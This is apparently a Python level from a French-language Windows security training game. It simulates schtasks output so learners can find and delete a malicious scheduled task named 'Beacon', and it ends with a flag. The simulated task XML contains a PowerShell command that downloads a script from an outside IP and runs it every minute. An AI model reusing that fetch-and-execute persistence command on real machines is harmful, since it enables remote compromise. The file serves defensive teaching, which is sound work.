import time
from .utils import (
    print_header,
    print_objectives,
    print_success,
    print_objective_done,
    generic_cmd_handler,
    CURRENT_DIR,
    print_windows_motd,
    build_prompt,
)


def run_level():
    title = "NIVEAU 18 : TÂCHES PLANIFIÉES (SCHTASKS)"
    objectives = [
        "Repérer la tâche planifiée malveillante 'Beacon' qui exécute un script toutes les minutes.",
        "Inspecter son action, puis la supprimer."
    ]
    Guide = [
        "schtasks /query /fo LIST /v — Lister toutes les tâches planifiées en détail pour repérer les entrées suspectes.",
        "schtasks /query /tn SystemMaintenance /fo LIST /v — Inspecter la tâche légitime pour connaître son comportement normal.",
        "schtasks /query /tn Beacon /fo LIST /v — Examiner Beacon : elle se répète chaque minute, c'est anormal.",
        "schtasks /query /tn Beacon /xml — Afficher la définition XML de Beacon pour voir la commande malveillante qu'elle exécute.",
        "schtasks /delete /tn Beacon /f — Supprimer la tâche malveillante sans confirmation.",
        "Méfiez-vous d'une tâche qui se répète toutes les minutes ou qui télécharge un script : c'est de la persistance.",
    ]
    hint = r"Essayez : schtasks /query /fo LIST /v"

    print_header(title)
    print_objectives(objectives, hint)
    print_windows_motd()

    done = set()

    while True:
        try:
            user_input = input(build_prompt(CURRENT_DIR)).strip()
            parts = user_input.split()
            cmd = parts[0].lower() if parts else ""
            args = parts[1:]
            arg_str = " ".join(args)
            low = user_input.lower()

            common = generic_cmd_handler(cmd, arg_str, Guide)
            if common == "EXIT":
                return False
            if common:
                continue

            if cmd == "schtasks":
                if "/tn" in low and "beacon" in low and "/xml" in low:
                    print("\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>")
                    print("<Task version=\"1.2\" xmlns=\"...\">")
                    print("  <Triggers><TimeTrigger><StartBoundary>2025-10-01T00:00:00</StartBoundary>")
                    print("    <Repetition><Interval>PT1M</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>")
                    print("  </TimeTrigger></Triggers>")
                    print("  <Actions><Exec>")
                    print("    <Command>powershell.exe</Command>")
                    print("    <Arguments>Invoke-WebRequest http://185.220.101.4/beacon.ps1 -OutFile $env:temp\\b.ps1; & $env:temp\\b.ps1</Arguments>")
                    print("  </Exec></Actions>")
                    print("</Task>")
                    print("\nCette tâche télécharge et exécute un script chaque minute : elle est malveillante !")
                    if 4 not in done:
                        done.add(4)
                        print("Vous avez terminé l'objectif 4 ! Supprimez-la avec schtasks /delete /tn \"Beacon\" /f.\n")
                elif "/tn" in low and "beacon" in low and ("/fo list" in low or "/fo csv" in low or "/v" in low):
                    print("\nB25E7A4A-8B6F-4D4A-9A3E-1C2D3E4F5A6B")
                    print("TaskName:   \\Beacon")
                    print("Status:     Running")
                    print("Schedule:   Every 1 minute")
                    print("Task To Run: powershell.exe -Command ...")
                    print("Start In:   C:\\Windows\\System32")
                    print("Comment:    system heartbeat")
                    print("Scheduled Task State: Enabled")
                    print("Scheduled Task Type: Minute")
                    print("Start Time: 12:00 AM")
                    print("\nLa tâche 'Beacon' est répétée chaque minute : suspecte !")
                    if 3 not in done:
                        done.add(3)
                        print("Vous avez terminé l'objectif 3 ! Inspectez son action avec /xml.\n")
                elif "/fo table" in low and "beacon" in low:
                    print("\nTaskName   Next Run Time          Status")
                    print("=========  =====================  ==========")
                    print("Beacon     10/3/2025 12:01:00 AM  Ready")
                    print("\nBeacon est prête à s'exécuter chaque minute.")
                    if 3 not in done:
                        done.add(3)
                        print("Vous avez terminé l'objectif 3 ! Inspectez son action avec /xml.\n")
                elif "/tn" in low and "systemmaintenance" in low:
                    print("\nTaskName:   \\SystemMaintenance")
                    print("Status:     Ready")
                    print("Schedule:   Daily at 3:00 AM")
                    print("Task To Run: C:\\Windows\\System32\\fsutil.exe ...")
                    print("Comment:    Entretien système légitime.")
                    if 2 not in done:
                        done.add(2)
                        print("Vous avez terminé l'objectif 2 ! Listez les tâches avec /fo LIST /v pour trouver la tâche répétée.\n")
                elif "/delete" in low and "beacon" in low and "/f" in low:
                    print("\nSUCCESS: The scheduled task \"Beacon\" has successfully been deleted.\n")
                    print("SUCCESS: La tâche malveillante Beacon a été supprimée.")
                    if 4 in done and 5 not in done:
                        done.add(5)
                        time.sleep(1)
                        print_success("Tâche malveillante supprimée. Niveau 18 terminé. FLAG=TW_SCHTASKS_18")
                        return True
                    elif 5 not in done:
                        print("Inspectez d'abord la tâche Beacon avec schtasks /query /tn \"Beacon\" /xml.")
                elif low.startswith("schtasks /query") and ("/fo list" in low or "/v" in low):
                    print("\nB25E7A4A-8B6F-4D4A-9A3E-1C2D3E4F5A6B")
                    print("TaskName:   \\SystemMaintenance")
                    print("Status:     Ready")
                    print("Schedule:   Daily at 3:00 AM")
                    print("Start In:   C:\\Windows\\System32")
                    print("\nB25E7A4A-8B6F-4D4A-9A3E-1C2D3E4F5A6C")
                    print("TaskName:   \\Beacon")
                    print("Status:     Running")
                    print("Schedule:   Every 1 minute")
                    print("\nLa tâche 'Beacon' est répétée chaque minute : suspecte !")
                    if 1 not in done:
                        done.add(1)
                        print_objective_done(1)
                else:
                    print("Utilisez schtasks /query /fo LIST /v pour lister les tâches.")
            else:
                print(f"'{user_input}' is not recognized.")

        except KeyboardInterrupt:
            return False


def main():
    return run_level()


if __name__ == "__main__":
    main()